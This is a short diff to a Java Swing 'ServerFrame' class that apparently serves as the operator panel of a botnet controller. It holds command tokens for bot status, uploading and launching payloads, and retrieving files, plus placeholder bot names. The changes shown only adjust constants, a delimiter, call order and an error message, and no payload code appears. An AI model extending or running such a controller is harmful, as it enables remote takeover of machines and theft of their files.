@@ -62,11 +62,11 @@ public class ServerFrame extends JFrame {
     //constants to set
     private final static String PYTHONSCRIPT = "";
     private final static String PYTHONPATH = "";
-    private final static String GETBOTSTATUS = "";
+    private final static String GETBOTSTATUS = "$GS$";
     private final static String UPLOADPAYLOADS = "$UP$";
     private final static String LAUNCHPAYLOADS = "$LP$";
     private final static String RETRIEVEFILES = "$RF$";
-    private final static char DELIMITER = '$';
+    private final static char DELIMITER = ';';
     
     private List<String> selectedValuesList;
     
@@ -166,8 +166,10 @@ public class ServerFrame extends JFrame {
 
 
         DefaultListModel<String> listModel = new DefaultListModel<>();
-        updateList();
+        
         //add starting bots to list
+        updateList();
+        
         
         //for testing
         listModel.addElement("Bot1");
@@ -250,6 +252,7 @@ public class ServerFrame extends JFrame {
         }
         catch(Exception e)
         {
+            System.out.println("failed to exec server");
             System.out.println(e);
         }
     }//end startUp()
